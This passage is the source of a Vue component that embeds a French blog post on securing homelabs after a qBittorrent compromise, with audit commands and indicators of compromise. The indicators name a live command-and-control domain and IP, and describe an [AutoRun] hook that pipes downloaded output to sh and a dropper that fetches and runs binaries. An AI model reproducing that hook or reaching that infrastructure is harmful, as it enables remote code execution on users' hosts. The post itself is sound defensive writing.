<p>Si vous faites tourner un homelab — n'importe quelle taille, n'importe quel reverse proxy, n'importe quel nombre de services — voici les quatre vérifications qui rattrapent 90% de ce type de bug.</p>

<p><strong>1. Grep pour les bascules trust-LAN.</strong></p>
<pre><code>grep -rIE "AuthSubnet|trust(ed)?_?(network|proxy|host)|allowed_hosts|local.?bypass|skip.?auth.?local|disabled_for_local" \\
  /opt/docker /etc 2&gt;/dev/null</code></pre>
<p>Si l'une est activée et que le service est joignable via votre reverse proxy, vous avez mon homelab d'il y a une semaine. La vérification spécifique qBit :</p>
<pre><code>grep -rE "AuthSubnetWhitelistEnabled=true" /opt/docker</code></pre>

<p><strong>2. Listez chaque routeur Traefik et ses middlewares.</strong></p>
<pre><code>for f in /opt/docker/*/compose.yml; do
  awk '/traefik\\.http\\.routers\\..*\\.rule=.*Host/,/networks:/' "$f" \\
    | grep -E "routers\\.[a-z0-9-]+\\.(rule|middlewares)" \\
    | sort -u
done</code></pre>
<p>Triez par nom de routeur. Tout routeur sans ligne <code>middlewares=</code> tourne sur sa propre auth interne uniquement. C'est un <em>choix délibéré</em>, pas un défaut. Assurez-vous que chacun est un choix dont vous vous souvenez.</p>

<p><strong>3. Tapez chaque URL admin depuis votre téléphone en 4G.</strong> Hors LAN, pas de Tailscale, rien. Si quoi que ce soit répond autre chose qu'un redirect vers un login ou un 401, c'est joignable depuis internet. Demandez-vous si vous voulez que ça le soit.</p>

<p><strong>4. Vérifiez <code>[AutoRun]</code> et équivalents sur tout ce qui exécute de l'input non fiable.</strong> La section <code>[AutoRun]</code> de qBittorrent. Les "Connect" custom-script de Sonarr/Radarr. Le service <code>shell_command</code> de Home Assistant. Les plugins webhooks de Jellyfin. Les webhooks de workflows n8n joignables publiquement. Si vous ne l'avez pas mis là, ça n'a rien à y faire.</p>

<p>Le lecteur qui fait tourner cinq services avec Caddy : même exercice, surface plus petite. <em>L'idée</em> ne dépend pas de Traefik ni de 40 services. <strong>Le modèle mental "le LAN est de confiance" est le bug.</strong> Remplacez-le.</p>

<h2>Une note sur ce qu'on ne peut pas auditer soi-même</h2>
<p>J'avais trois trucs grands ouverts. Deux étaient des applis installées il y a des années et jamais reverifiées. Une était un <code>http_password=""</code> vide depuis le jour du déploiement, jamais touché. <strong>La dérive de configuration vers le ouvert est l'état naturel d'un homelab.</strong> Vous ajoutez des services, vous tweakez des paramètres, vous oubliez des défauts, vous upgradez et perdez un flag de config, vous lisez un tuto qui dit "for testing" et vous n'y revenez jamais. L'audit n'est pas un événement unique. C'est une corvée récurrente, dans un calendrier, comme une vidange.</p>
<p>Et : <strong>ne faites pas confiance à votre monitoring pour rattraper ça à votre place.</strong> J'avais Beszel, Uptime Kuma, Dozzle, le query log de Pi-hole, tout. Aucun n'a tiqué parce que rien ne <em>ratait</em>. Le compromis était à l'intérieur de l'application, et l'application tournait <em>mieux</em> que d'habitude du point de vue de l'attaquant. Le signal qui a trouvé ça, c'était visuel : une icône rouge que j'ai regardée par hasard. Il n'y a pas de SIEM dans un homelab. Vous êtes le SIEM, et vos yeux ne sont pas un langage de requête.</p>

<h2>Indicateurs de compromis</h2>
<p>Si vous faites tourner qBittorrent et voulez confirmer que vous n'avez pas été touché par la même vague, voilà ce qu'il faut chercher. Ce sont les IoCs de cet incident ; c'est de l'information défenseurs publique.</p>
<ul>
<li><strong>Domaine C2 :</strong> <code>yify.foo</code></li>
<li><strong>IP C2 :</strong> <code>172.245.88.160</code> (ColoCrossing, la même plage qui héberge une longue liste de droppers de mass-exploitation similaires)</li>
<li><strong>Stage 1 dans <code>qBittorrent.conf</code> :</strong> tout bloc <code>[AutoRun]</code> avec <code>OnTorrentAdded\\Program</code> qui pipe la sortie vers <code>sh</code></li>
<li><strong>Stage 2 dropper</strong> (1945 octets, servi depuis <code>http://yify.foo/</code>) : script shell multi-arch, branche sur <code>uname -m</code>, fetch un binaire depuis <code>/1</code>, <code>/2</code> ou <code>/3</code> sur l'IP C2, drop dans chaque mount writable avec un nom aléatoire de 8 caractères, exécute, supprime le fichier</li>
<li><strong>IoC process :</strong> <code>ls -la /proc/*/exe 2&gt;/dev/null | grep deleted</code> — process stage-2 fileless dont l'inode du binaire est manquant</li>
<li><strong>IoC réseau :</strong> DNS sortant pour <code>yify.foo</code> ou tout TCP vers <code>172.245.88.160</code> depuis un conteneur qui fait tourner qBit, sonarr, radarr, plex, ou tout ce qui partage leurs volumes</li>
</ul>
<p>Si vous trouvez l'un de ces, traitez l'hôte comme compromis : arrêtez le conteneur affecté, sanitisez la config, faites une rotation de chaque credential auquel le conteneur avait accès, bloquez le C2 sur trois couches (DNS, hôte, edge), et auditez le reste de votre stack pour le même pattern. Ne tuez pas juste le process — c'est le stage 2, la config autorun le respawnera au prochain torrent ajouté.</p>

<h2>Conclusion</h2>
<p>J'ai passé 9 ans à écrire du logiciel pour des hôpitaux. J'ai des opinions sur les systèmes à fortes conséquences. Je me suis quand même fait avoir par une case à cocher par défaut.</p>
<p>La leçon n'est pas que les homelabs ne sont pas sûrs. Ils sont aussi sûrs que vous les rendez. La leçon, c'est que le modèle a changé. <em>Derrière le proxy</em> voulait dire <em>derrière le périmètre</em>. Plus maintenant. Le proxy <em>est</em> le périmètre, et le périmètre est en papier mâché si les applis derrière croient qu'elles sont sur un LAN de confiance.</p>
<p><strong>Votre reverse proxy n'est pas un firewall. C'est un couloir.</strong> Si vous n'avez pas de porte au bout, vos applis sont dans un hall public. Les miennes l'étaient. Trois d'entre elles, en tout cas.</p>
<p>Plus maintenant.</p>`
}

export function getContent(locale: 'fr' | 'en'): PostContent {
  return locale === 'fr' ? frenchContent : englishContent
}

export default defineComponent({
  name: 'LanIsDead',
  props: {
    locale: {
      type: String as () => 'fr' | 'en',
      required: true
    }
  },
  setup(props) {
    const content = computed(() => {
      return getContent(props.locale)
    })
    return { content }
  },
  template: '<div v-html="content.html"></div>'
})
</script>

<template>
  <div v-html="content.html"></div>
</template>
